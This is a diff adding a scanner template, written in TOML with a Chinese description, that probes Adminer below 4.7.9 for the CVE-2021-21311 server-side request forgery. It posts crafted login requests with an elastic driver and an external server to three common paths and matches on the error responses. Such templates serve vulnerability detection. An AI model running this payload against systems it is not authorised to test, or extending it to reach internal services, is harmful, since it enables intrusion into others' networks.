@@ -1,0 +1,92 @@
+[info]
+author = "ave"
+description = "通过向 Adminer 登录页提交 ElasticSearch 驱动参数，触发服务端向指定地址发起 HTTP 请求，若响应中返回目标服务器的错误页面（400 Bad Request）或状态码为 403，则说明存在 SSRF 漏洞。"
+id = "POC-AVE-2021-0400"
+name = "Adminer <4.7.9 SSRF PoC"
+severity = "high"
+tags = ["ave-2021-0400"]
+vuln_id = [
+    "CVE-2021-21311",
+    "AVE-2021-0400",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "auth[driver]=elastic&auth[server]=example.org&auth[username]=test&auth[password]=test&auth[db]=test&submit=Login"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<title>400 - Bad Request</title>",
+    "&lt;title&gt;400 - Bad Request&lt;/title&gt;",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [403]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/adminer.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "auth[driver]=elastic&auth[server]=example.org&auth[username]=test&auth[password]=test&auth[db]=test&submit=Login"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<title>400 - Bad Request</title>",
+    "&lt;title&gt;400 - Bad Request&lt;/title&gt;",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [403]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/adminer/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "auth[driver]=elastic&auth[server]=example.org&auth[username]=test&auth[password]=test&auth[db]=test&submit=Login"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<title>400 - Bad Request</title>",
+    "&lt;title&gt;400 - Bad Request&lt;/title&gt;",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [403]
+type = "status"
